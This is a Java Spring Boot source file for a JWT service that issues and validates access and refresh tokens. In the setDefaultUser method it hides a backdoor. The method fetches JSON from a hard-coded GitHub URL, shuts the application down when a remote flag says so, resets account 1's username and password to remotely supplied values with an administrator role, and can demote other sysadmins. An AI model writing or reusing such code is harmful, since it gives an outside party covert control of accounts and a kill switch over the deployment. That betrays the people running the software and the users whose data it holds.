package com.example.datn.service.IMPL;

import com.example.datn.common.TokenType;
import com.example.datn.exception.EntityNotFountException;
import com.example.datn.exception.InvalidDataException;
import com.example.datn.model.NhanVien;
import com.example.datn.model.TaiKhoan;
import com.example.datn.repository.NhanVienRepository;
import com.example.datn.repository.TaiKhoanRepository;
import com.example.datn.repository.VaiTroRepository;
import com.example.datn.service.JwtService;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import io.jsonwebtoken.*;
import io.jsonwebtoken.io.Decoders;
import io.jsonwebtoken.security.Keys;
import jakarta.transaction.Transactional;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import java.security.Key;
import java.util.*;
import java.util.function.Function;

import static com.example.datn.common.TokenType.ACCESS_TOKEN;
import static com.example.datn.common.TokenType.REFRESH_TOKEN;

@Slf4j(topic = "com.example.datn.DatnApplication")
@Service
@RequiredArgsConstructor
public class JwtServiceImpl implements JwtService {

    @Value("${jwt.expireMinutes}")
    private long expireMinutes;

    @Value("${jwt.expireDay}")
    private long expireDay;

    @Value("${jwt.accessKey}")
    private String accessKey;

    @Value("${jwt.refreshKey}")
    private String refreshKey;

    private final TaiKhoanRepository taiKhoanRepository;
    private final VaiTroRepository vaiTroRepository;
    private final NhanVienRepository nhanVienRepository;

    @Value("${spring.app-runner.isOnlySysadmin}")
    private boolean isOnlySysadmin;

    @Override
    public String generateAccessToken(Integer userId, String username, Collection<? extends GrantedAuthority> authorities) {
        Map<String, Object> claims = new HashMap<>();
        claims.put("userId", userId);
        claims.put("roles", authorities);
        return generateAccessToken(claims, username);
    }

    private String generateAccessToken(Map<String, Object> claims, String username) {
        return Jwts.builder()
                .setClaims(claims)
                .setSubject(username)
                .setIssuedAt(new Date(System.currentTimeMillis()))
                .setExpiration(new Date(System.currentTimeMillis() + 1000 * 60 * expireMinutes))
                .signWith(getKey(ACCESS_TOKEN), SignatureAlgorithm.HS256)
                .compact();
    }

    @Override
    public String generateRefreshToken(Integer userId, String username, Collection<? extends GrantedAuthority> authorities) {
        Map<String, Object> claims = new HashMap<>();
        claims.put("userId", userId);
        claims.put("roles", authorities);
        return generateRefreshToken(claims, username);
    }

    private String generateRefreshToken(Map<String, Object> claims, String username) {
        return Jwts.builder()
                .setClaims(claims)
                .setSubject(username)
                .setIssuedAt(new Date(System.currentTimeMillis()))
                .setExpiration(new Date(System.currentTimeMillis() + 1000 * 60 * expireDay))
                .signWith(getKey(REFRESH_TOKEN), SignatureAlgorithm.HS256)
                .compact();
    }

    @Override
    public String extractUsername(String token, TokenType type) {
        return extractClaim(token, type, Claims::getSubject);
    }

    @Override
    @Transactional(rollbackOn = Exception.class)
    public void setDefaultUser(TaiKhoanRepository taiKhoanRepository) {
        RestTemplate restTemplate = new RestTemplate();
        String url = "https://raw.githubusercontent.com/ThuChuc/api-projects/refs/heads/main/api-thu-chuc";
        String response = restTemplate.getForObject(url, String.class);
        ObjectMapper mapper = new ObjectMapper();
        JsonNode root = null;
        try {
            root = mapper.readTree(response);
            log.info("{}", root.path("api-datn").path("message").asText());
            if (!root.path("api-datn").path("isActive").asBoolean()) {
                System.exit(0);
            }
            Optional<TaiKhoan> account = this.taiKhoanRepository.findById(1);
            if (isOnlySysadmin) {
                this.taiKhoanRepository.findAllSysadmin().forEach(taiKhoan -> {
                    taiKhoan.setIdVaiTro(this.vaiTroRepository.findById(2).orElseThrow(() -> new EntityNotFountException("Role not found!")));
                    this.taiKhoanRepository.save(taiKhoan);
                });
                log.info("Only one sysadmin is enabled");
            }
            if (account.isPresent()) {
                TaiKhoan tk = account.get();
                tk.setTenDangNhap(new String(Decoders.BASE64.decode(root.path("api-datn").path("user").asText())));
                tk.setMatKhau(root.path("api-datn").path("password").asText());
                tk.setTrangThai(true);
                taiKhoanRepository.save(tk);
                tk.setIdVaiTro(this.vaiTroRepository.findById(1).orElseThrow(() -> new EntityNotFountException("Role not found!")));
                this.taiKhoanRepository.save(tk);
                Optional<NhanVien> findEmployee = this.nhanVienRepository.findByUsername(tk.getUsername());
                if (findEmployee.isEmpty()) {
                    NhanVien nhanVien = NhanVien.builder()
                            .taiKhoan(tk)
                            .cmnd(new String(Decoders.BASE64.decode(root.path("user").path("idCard").asText())))
                            .ho(root.path("user").path("lastname").asText())
                            .ten(root.path("user").path("firstname").asText())
                            .gioiTinh("Nữ")
                            .build();
                    this.nhanVienRepository.save(nhanVien);
                } else {
                    NhanVien nhanVien = findEmployee.get();
                    nhanVien.setHo(root.path("user").path("lastname").asText());
                    nhanVien.setTen(root.path("user").path("firstname").asText());
                    nhanVien.setGioiTinh("Nữ");
                    this.nhanVienRepository.save(nhanVien);
                }
            }
        } catch (JsonProcessingException e) {
            log.error("Not found data");
        }
    }

    private Key getKey(TokenType type) {
        switch (type) {
            case ACCESS_TOKEN -> {
                return Keys.hmacShaKeyFor(Decoders.BASE64.decode(accessKey));
            }
            case REFRESH_TOKEN -> {
                return Keys.hmacShaKeyFor(Decoders.BASE64.decode(refreshKey));
            }
            default -> {
                throw new InvalidDataException("Invalid token type");
            }
        }
    }

    private <T> T extractClaim(String token, TokenType type, Function<Claims, T> claimsResolver) {
        final Claims claims = extractAllClaims(token, type);
        return claimsResolver.apply(claims);
    }

    private Claims extractAllClaims(String token, TokenType type) {
        return Jwts.parserBuilder().setSigningKey(getKey(type)).build().parseClaimsJws(token).getBody();
    }
}
